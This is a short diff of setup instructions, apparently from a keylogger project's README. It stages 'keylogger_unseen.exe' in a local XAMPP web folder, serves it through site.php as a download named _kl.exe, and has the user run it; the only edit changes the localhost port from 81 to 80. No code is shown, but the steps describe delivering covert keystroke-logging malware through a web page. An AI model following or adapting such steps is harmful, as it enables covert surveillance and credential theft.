@@ -6,7 +6,7 @@ Run xampp_controller
 Add keylogger_unseen.exe to C:\xampp\htdocs\Python_exe
 	(if keylogger_seen.exe, change in site.php)
 
-Go to http://localhost:81/Python_exe/site.php
+Go to http://localhost:80/Python_exe/site.php
 	Downloads _kl.exe
 
 Run _kl.exe
